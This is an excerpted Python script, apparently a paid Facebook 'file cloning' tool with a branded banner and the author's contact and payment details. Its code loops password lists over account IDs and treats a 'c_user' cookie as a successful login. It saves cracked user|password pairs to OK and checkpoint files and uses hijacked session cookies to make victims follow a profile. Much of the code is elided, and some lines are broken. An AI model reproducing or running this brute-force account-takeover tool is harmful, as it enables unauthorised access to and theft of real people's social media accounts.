...
logo =                                          """   
➣  \x1b[1;92m##    ##    \x1b[1;90m###    \x1b[1;94m##     ##  \x1b[1;96m#####     \x1b[1;94m##     ##
➣  \x1b[1;92m###   ##    \x1b[1;90m## ##   \x1b[1;94m##     ## \x1b[1;96m##   \x1b[1;94m###   ###
➣  \x1b[1;92m####  ##    \x1b[1;90m##   ##  \x1b[1;94m##     ## \x1b[1;96m##        \x1b[1;94m#### ####
➣  \x1b[1;92m## ## ##     \x1b[1;90m##     ## \x1b[1;94m#########   \x1b[1;96m######  \x1b[1;94m## ### ##
➣  \x1b[1;92m##  ####   \x1b[1;90m######### \x1b[1;94m##     ##       \x1b[1;96m## \x1b[1;94m##     ##
...
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄NAHIM᭄
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄NAHIM᭄
                           \x1b[1;92m╔═════════════════════════════╗
                           \x1b[1;92m║➣TOOL NAME : { FILE CLONING }   ║
                           \x1b[1;92m║➣AUTHOR    : MR. NAHIM      ║
                           \x1b[1;92m║➣GITHUB    : git.me/Nahim404 ║
                           \x1b[1;92m║➣FACEBOOK  : Chand Muhammad Khan   ║
                           \x1b[1;92m║➣Group     : Cyber 420 The Silent Killer's ║
                           \x1b[1;92m║➣WHATSAPP  : [ +8801790104683 ]       ║
                           \x1b[1;92m╚═════════════════════════════╝
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄NAHIM᭄
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄NAHIM᭄
"""                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mMr.Nahim_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mMr.Nahim_CP.txt' % (H, P, str(len(cp))))
...
def mr_kausar():
    ...
    print('')
    _kausar___ = input('\033[0;95m [?] CHOOSE OPTION : ')
    if _kausar___ in ('1', '01'):
        __xxx__().kausarx(id)
    if _kausar___ in ('2', '02'):
        os.system('python Psycho.py')
    if _kausar___ in ('3', '03'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r[➣]\x1b[1;92m[MrK4US4R] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[Mr.Nahim-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Mr.Nahim_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[Mr.Nahim-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Mr.Nahim_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100077031805521', cookies={'cookie': coki}).text, 'html.parser')
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rTool Price Inbox\n')
        print
        print('\Bkash Account Number 01790104683\n')
        print('\Facebook Account Name ➣ Chand Muhammad Khan\n')
        print
        print
...
def bnsreg():
    ...
    print('\rTool Price Inbox\n')
    print
    print('\Bkash Account Number 01746144981\n')
    print('\rAccount Name ➣ Chand Muhammad Khan\n')
    print
